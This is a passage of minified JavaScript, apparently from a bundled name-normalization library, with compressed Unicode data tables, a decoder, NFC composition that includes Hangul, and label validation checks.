moy7zsxehW9wzcy2zG0a80PBMCRQMb32hnaHeOR8fnNDzZhaNYhkOdDsBUZ3loDMa1YP0uS0cjUP3b/6DBlqmZOeNABDsLl5BI5QJups8uxAuWJdkUB/pO6Zax6tsg7fN5mjjDgMGngO+DPcKqiHIDbFIGudxtPTIyDi9SFMKBDcfdGQRv41q1AqmxgkVfJMnP8w/Bc7N9/TR6C7mGObFqFkIEom8sKi2xYqJLTCHK7cxzaZvqODo22c3wisBCP4HeAgcRbNPAsBkNRhSmD48dHupdBRw4mIvtS5oeF6zeT1KMCyhMnmhpkFAGWnGscoNkwvQ8ZM5lE/vgTHFYL99OuNxdFBxTEDd5v2qLR8y9WkXsWgG6kZNndFG+pO/UAkOCipqIhL3hq7cRSdrCq7YhUsTocEcnaFa6nVkhnSeRYUA1YO0z5itF9Sly3VlxYDw239TJJH6f3EUfYO5lb7bcFcz8Bp7Oo8QmnsUHOz/fagVUBtKEw1iT88j+aKkv8cscKNkMxjYr8344D1kFoZ7/td1W6LCNYN594301tUGRmFjAzeRg5vyoM1F6+bJZ/Q54jN/k8SFd3DxPTYaAUsivsBfgTn7Mx8H2SpPt4GOdYRnEJOH6jHM2p6SgB0gzIRq6fHxGMmSmqaPCmlfwxiuloaVIitLGN8wie2CDWhkzLoCJcODh7KIOAqbHEvXdUxaS4TTTs07Clzj/6GmVs9kiZDerMxEnhUB6QQPlcfqkG9882RqHoLiHGBoHfQuXIsAG8GTAtao2KVwRnvvam8jo1e312GQAKWEa4sUVEAMG4G6ckcONDwRcg1e2D3+ohXgY4UAWF8wHKQMrSnzCgfFpsxh+aHXMGtPQroQasRY4U6UdG0rz1Vjbka0MekOGRZQEvqQFlxseFor8zWFgHek3v29+WqN6gaK5gZOTOMZzpQIC1201LkMCXild3vWXSc5UX9xcFYfbRPzGFa1FDcPfPB/jUEq/FeGt419CI3YmBlVoHsa4KdcwQP5ZSwHHhFJ7/Ph/Rap/4vmG91eDwPP0lDfCDRCLszTqfzM71xpmiKi2HwS4WlqvGNwtvwF5Dqpn6KTq8ax00UMPkxDcZrEEEsIvHiUXXEphdb4GB4FymlPwBz4Gperqq5pW7TQ6/yNRhW8VT5NhuP0udlxo4gILq5ZxAZk8ZGh3g4CqxJlPKY7AQxupfUcVpWT5VItp1+30UqoyP4wWsRo3olRRgkWZZ2ZN6VC3OZFeXB8NbnUrSdikNptD1QiGuKkr8EmSR/AK9Rw+FF3s5uwuPbvHGiPeFOViltMK7AUaOsq9+x9cndk3iJEE5LKZRlWJbKOZweROzmPNVPkjE3K/TyA57Rs68TkZ3MR8akKpm7cFjnjPd/DdkWjgYoKHSr5Wu5ssoBYU4acRs5g2DHxUmdq8VXOXRbunD8QN0LhgkssgahcdoYsNvuXGUK/KXD/7oFb+VGdhqIn02veuM5bLudJOc2Ky0GMaG4W/xWBxIJcL7yliJOXOpx0AkBqUgzlDczmLT4iILXDxxtRR1oZa2JWFgiAb43obrJnG/TZC2KSK2wqOzRZTXavZZFMb1f3bXvVaNaK828w9TO610gk8JNf3gMfETzXXsbcvRGCG9JWQZ6+cDPqc4466Yo2RcKH+PILeKOqtnlbInR3MmBeGG3FH10yzkybuqEC2HSQwpA0An7d9+73BkDUTm30bZmoP/RGbgFN+GrCOfADgqr0WbI1a1okpFms8iHYw9hm0zUvlEMivBRxModrbJJ+9/p3jUdQQ9BCtQdxnOGrT5dzRUmw0593/mbRSdBg0nRvRZM5/E16m7ZHmDEtWhwvfdZCZ8J8M12W0yRMszXamWfQTwIZ4ayYktrnscQuWr8idp3PjT2eF/jmtdhIfcpMnb+IfZY2FebW6UY/AK3jP4u3Tu4zE4qlnQgLFbM19EBIsNf7KhjdbqQ/D6yiDb+NlEi2SKD+ivXVUK8ib0oBo366gXkR8ZxGjpJIDcEgZPa9TcYe0TIbiPl/rPUQDu3XBJ9X/GNq3FAUsKsll57DzaGMrjcT+gctp+9MLYXCq+sqP81eVQ0r9lt+gcQfZbACRbEjvlMskztZG8gbC8Qn9tt26Q7y7nDrbZq/LEz7kR6Jc6pg3N9rVX8Y5MJrGlML9p9lU4jbTkKqCveeZUJjHB03m2KRKR2TytoFkTXOLg7keU1s1lrPMQJpoOKLuAAC+y1HlJucU6ysB5hsXhvSPPLq5J7JtnqHKZ4vYjC4Vy8153QY+6780xDuGARsGbOs1WqzH0QS765rnSKEbbKlkO8oI/VDwUd0is13tKpqILu1mDJFNy/iJAWcvDgjxvusIT+PGz3ST/J9r9Mtfd0jpaGeiLYIqXc7DiHSS8TcjFVksi66PEkxW1z6ujbLLUGNNYnzOWpH8BZGK4bCK7iR+MbIv8ncDAz1u4StN3vTTzewr9IQjk9wxFxn+6N1ddKs0vffJiS08N3a4G1SVrlZ97Q/M+8G9fe5AP6d9/Qq4WRnORVhofPIKEdCr3llspUfE0oKIIYoByBRPh+bX1HLS3JWGJRhIvE1aW4NTd8ePi4Z+kXb+Z8snYfSNcqijhAgVsx4RCM54cXUiYkjeBmmC4ajOHrChoELscJJC7+9jjMjw5BagZKlgRMiSNYz7h7vvZIoQqbtQmspc0cUk1G/73iXtSpROl5wtLgQi0mW2Ex8i3WULhcggx6E1LMVHUsdc9GHI1PH3U2Ko0PyGdn9KdVOLm7FPBui0i9a0HpA60MsewVE4z8CAt5d401Gv6zXlIT5Ybit1VIA0FCs7wtvYreru1fUyW3oLAZ/+aTnZrOcYRNVA8spoRtlRoWflsRClFcgzkqiHOrf0/SVw+EpVaFlJ0g4Kxq1MMOmiQdpMNpte8lMMQqm6cIFXlnGbfJllysKDi+0JJMotkqgIxOSQgU9dn/lWkeVf8nUm3iwX2Nl3WDw9i6AUK3vBAbZZrcJpDQ/N64AVwjT07Jef30GSSmtNu2WlW7YoyW2FlWfZFQUwk867EdLYKk9VG6JgEnBiBxkY7LMo4YLQJJlAo9l/oTvJkSARDF/XtyAzM8O2t3eT/iXa6wDN3WewNmQHdPfsxChU/KtLG2Mn8i4ZqKdSlIaBZadxJmRzVS/o4yA65RTSViq60oa395Lqw0pzY4SipwE0SXXsKV+GZraGSkr/RW08wPRvqvSUkYBMA9lPx4m24az+IHmCbXA+0faxTRE9wuGeO06DIXa6QlKJ3puIyiuAVfPr736vzo2pBirS+Vxel3TMm3JKhz9o2ZoRvaFVpIkykb0Hcm4oHFBMcNSNj7/4GJt43ogonY2Vg4nsDQIWxAcorpXACzgBqQPjYsE/VUpXpwNManEru4NwMCFPkXvMoqvoeLN3qyu/N1eWEHttMD65v19l/0kH2mR35iv/FI+yjoHJ9gPMz67af3Mq/BoWXqu3rphiWMXVkmnPSEkpGpUI2h1MThideGFEOK6YZHPwYzMBvpNC7+ZHxPb7epfefGyIB4JzO9DTNEYnDLVVHdQyvOEVefrk6Uv5kTQYVYWWdqrdcIl7yljwwIWdfQ/y+2QB3eR/qxYObuYyB4gTbo2in4PzarU1sO9nETkmj9/AoxDA+JM3GMqQtJR4jtduHtnoCLxd1gQUscHRB/MoRYIEsP2pDZ9KvHgtlk1iTbWWbHhohwFEYX7y51fUV2nuUmnoUcqnWIQAAgl9LTVX+Bc0QGNEhChxHR4YjfE51PUdGfsSFE6ck7BL3/hTf9jLq4G1IafINxOLKeAtO7quulYvH5YOBc+zX7CrMgWnW47/jfRsWnJjYYoE7xMfWV2HN2iyIqLI";const CG=new Map([[8217,"apostrophe"],[8260,"fraction slash"],[12539,"middle dot"]]),SG=4;function XMe(t){let e=0;function n(){return t[e++]<<8|t[e++]}let r=n(),i=1,s=[0,1];for(let k=1;k<r;k++)s.push(i+=n());let o=n(),a=e;e+=o;let c=0,l=0;function f(){return c==0&&(l=l<<8|t[e++],c=8),l>>--c&1}const h=31,m=2**h,b=m>>>1,w=b>>1,y=m-1;let E=0;for(let k=0;k<h;k++)E=E<<1|f();let A=[],R=0,S=m;for(;;){let k=Math.floor(((E-R+1)*i-1)/S),O=0,_=r;for(;_-O>1;){let B=O+_>>>1;k<s[B]?_=B:O=B}if(O==0)break;A.push(O);let I=R+Math.floor(S*s[O]/i),T=R+Math.floor(S*s[O+1]/i)-1;for(;((I^T)&b)==0;)E=E<<1&y|f(),I=I<<1&y,T=T<<1&y|1;for(;I&~T&w;)E=E&b|E<<1&y>>>1|f(),I=I<<1^b,T=(T^b)<<1|b|1;R=I,S=1+T-I}let v=r-4;return A.map(k=>{switch(k-v){case 3:return v+65792+(t[a++]<<16|t[a++]<<8|t[a++]);case 2:return v+256+(t[a++]<<8|t[a++]);case 1:return v+t[a++];default:return k-1}})}function eUe(t){let e=0;return()=>t[e++]}function nue(t){return eUe(XMe(tUe(t)))}function tUe(t){let e=[];[..."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"].forEach((i,s)=>e[i.charCodeAt(0)]=s);let n=t.length,r=new Uint8Array(6*n>>3);for(let i=0,s=0,o=0,a=0;i<n;i++)a=a<<6|e[t.charCodeAt(i)],o+=6,o>=8&&(r[s++]=a>>(o-=8));return r}function nUe(t){return t&1?~t>>1:t>>1}function rUe(t,e){let n=Array(t);for(let r=0,i=0;r<t;r++)n[r]=i+=nUe(e());return n}function I_(t,e=0){let n=[];for(;;){let r=t(),i=t();if(!i)break;e+=r;for(let s=0;s<i;s++)n.push(e+s);e+=i+1}return n}function rue(t){return R_(()=>{let e=I_(t);if(e.length)return e})}function iue(t){let e=[];for(;;){let n=t();if(n==0)break;e.push(iUe(n,t))}for(;;){let n=t()-1;if(n<0)break;e.push(sUe(n,t))}return e.flat()}function R_(t){let e=[];for(;;){let n=t(e.length);if(!n)break;e.push(n)}return e}function sue(t,e,n){let r=Array(t).fill().map(()=>[]);for(let i=0;i<e;i++)rUe(t,n).forEach((s,o)=>r[o].push(s));return r}function iUe(t,e){let n=1+e(),r=e(),i=R_(e);return sue(i.length,1+t,e).flatMap((o,a)=>{let[c,...l]=o;return Array(i[a]).fill().map((f,h)=>{let m=h*r;return[c+h*n,l.map(b=>b+m)]})})}function sUe(t,e){let n=1+e();return sue(n,1+t,e).map(i=>[i[0],i.slice(1)])}function oUe(t){let e=[],n=I_(t);return i(r([]),[]),e;function r(s){let o=t(),a=R_(()=>{let c=I_(t).map(l=>n[l]);if(c.length)return r(c)});return{S:o,B:a,Q:s}}function i({S:s,B:o},a,c){if(!(s&4&&c===a[a.length-1])){s&2&&(c=a[a.length-1]),s&1&&e.push(a);for(let l of o)for(let f of l.Q)i(l,[...a,f],c)}}}function aUe(t){return t.toString(16).toUpperCase().padStart(2,"0")}function oue(t){return`{${aUe(t)}}`}function cUe(t){let e=[];for(let n=0,r=t.length;n<r;){let i=t.codePointAt(n);n+=i<65536?1:2,e.push(i)}return e}function q1(t){let n=t.length;if(n<4096)return String.fromCodePoint(...t);let r=[];for(let i=0;i<n;)r.push(String.fromCodePoint(...t.slice(i,i+=4096)));return r.join("")}function uUe(t,e){let n=t.length,r=n-e.length;for(let i=0;r==0&&i<n;i++)r=t[i]-e[i];return r}var lUe="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";const P_=44032,fI=4352,hI=4449,pI=4519,aue=19,cue=21,V1=28,mI=cue*V1,dUe=aue*mI,fUe=P_+dUe,hUe=fI+aue,pUe=hI+cue,mUe=pI+V1;function Y2(t){return t>>24&255}function uue(t){return t&16777215}let pD,TG,mD,QT;function gUe(){let t=nue(lUe);pD=new Map(rue(t).flatMap((e,n)=>e.map(r=>[r,n+1<<24]))),TG=new Set(I_(t)),mD=new Map,QT=new Map;for(let[e,n]of iue(t)){if(!TG.has(e)&&n.length==2){let[r,i]=n,s=QT.get(r);s||(s=new Map,QT.set(r,s)),s.set(i,e)}mD.set(e,n.reverse())}}function lue(t){return t>=P_&&t<fUe}function yUe(t,e){if(t>=fI&&t<hUe&&e>=hI&&e<pUe)return P_+(t-fI)*mI+(e-hI)*V1;if(lue(t)&&e>pI&&e<mUe&&(t-P_)%V1==0)return t+(e-pI);{let n=QT.get(t);return n&&(n=n.get(e),n)?n:-1}}function due(t){pD||gUe();let e=[],n=[],r=!1;function i(s){let o=pD.get(s);o&&(r=!0,s|=o),e.push(s)}for(let s of t)for(;;){if(s<128)e.push(s);else if(lue(s)){let o=s-P_,a=o/mI|0,c=o%mI/V1|0,l=o%V1;i(fI+a),i(hI+c),l>0&&i(pI+l)}else{let o=mD.get(s);o?n.push(...o):i(s)}if(!n.length)break;s=n.pop()}if(r&&e.length>1){let s=Y2(e[0]);for(let o=1;o<e.length;o++){let a=Y2(e[o]);if(a==0||s<=a){s=a;continue}let c=o-1;for(;;){let l=e[c+1];if(e[c+1]=e[c],e[c]=l,!c||(s=Y2(e[--c]),s<=a))break}s=Y2(e[o])}}return e}function bUe(t){let e=[],n=[],r=-1,i=0;for(let s of t){let o=Y2(s),a=uue(s);if(r==-1)o==0?r=a:e.push(a);else if(i>0&&i>=o)o==0?(e.push(r,...n),n.length=0,r=a):n.push(a),i=o;else{let c=yUe(r,a);c>=0?r=c:i==0&&o==0?(e.push(r),r=a):(n.push(a),i=o)}}return r>=0&&e.push(r,...n),e}function fue(t){return due(t).map(uue)}function wUe(t){return bUe(due(t))}const xG=45,hue=".",pue=65039,mue=1,gI=t=>Array.from(t);function N_(t,e){return t.P.has(e)||t.Q.has(e)}class vUe extends Array{get is_emoji(){return!0}}let gD,gue,qm,yD,yue,c1,RO,Mb,Cm,IG,bD;function Sj(){if(gD)return;let t=nue(JMe);const e=()=>I_(t),n=()=>new Set(e()),r=(f,h)=>h.forEach(m=>f.add(m));gD=new Map(iue(t)),gue=n(),qm=e(),yD=new Set(e().map(f=>qm[f])),qm=new Set(qm),yue=n(),n();let i=rue(t),s=t();const o=()=>{let f=new Set;return e().forEach(h=>r(f,i[h])),r(f,e()),f};c1=R_(f=>{let h=R_(t).map(m=>m+96);if(h.length){let m=f>=s;h[0]-=32,h=q1(h),m&&(h=`Restricted[${h}]`);let b=o(),w=o(),y=!t();return{N:h,P:b,Q:w,M:y,R:m}}}),RO=n(),Mb=new Map;let a=e().concat(gI(RO)).sort((f,h)=>f-h);a.forEach((f,h)=>{let m=t(),b=a[h]=m?a[h-m]:{V:[],M:new Map};b.V.push(f),RO.has(f)||Mb.set(f,b)});for(let{V:f,M:h}of new Set(Mb.values())){let m=[];for(let w of f){let y=c1.filter(A=>N_(A,w)),E=m.find(({G:A})=>y.some(R=>A.has(R)));E||(E={G:new Set,V:[]},m.push(E)),E.V.push(w),r(E.G,y)}let b=m.flatMap(w=>gI(w.G));for(let{G:w,V:y}of m){let E=new Set(b.filter(A=>!w.has(A)));for(let A of y)h.set(A,E)}}Cm=new Set;let c=new Set;const l=f=>Cm.has(f)?c.add(f):Cm.add(f);for(let f of c1){for(let h of f.P)l(h);for(let h of f.Q)l(h)}for(let f of Cm)!Mb.has(f)&&!c.has(f)&&Mb.set(f,mue);r(Cm,fue(Cm)),IG=oUe(t).map(f=>vUe.from(f)).sort(uUe),bD=new Map;for(let f of IG){let h=[bD];for(let m of f){let b=h.map(w=>{let y=w.get(m);return y||(y=new Map,w.set(m,y)),y});m===pue?h.push(...b):h=b}for(let m of h)m.V=f}}function Tj(t){return(bue(t)?"":`${xj(I8([t]))} `)+oue(t)}function xj(t){return`"${t}"`}function EUe(t){if(t.length>=4&&t[2]==xG&&t[3]==xG)throw new Error(`invalid label extension: "${q1(t.slice(0,4))}"`)}function _Ue(t){for(let n=t.lastIndexOf(95);n>0;)if(t[--n]!==95)throw new Error("underscore allowed only at start")}function AUe(t){let e=t[0],n=CG.get(e);if(n)throw pE(`leading ${n}`);let r=t.length,i=-1;for(let s=1;s<r;s++){e=t[s];let o=CG.get(e);if(o){if(i==s)throw pE(`${n} + ${o}`);i=s+1,n=o}}if(i==r)throw pE(`trailing ${n}`)}function I8(t,e=1/0,n=oue){let 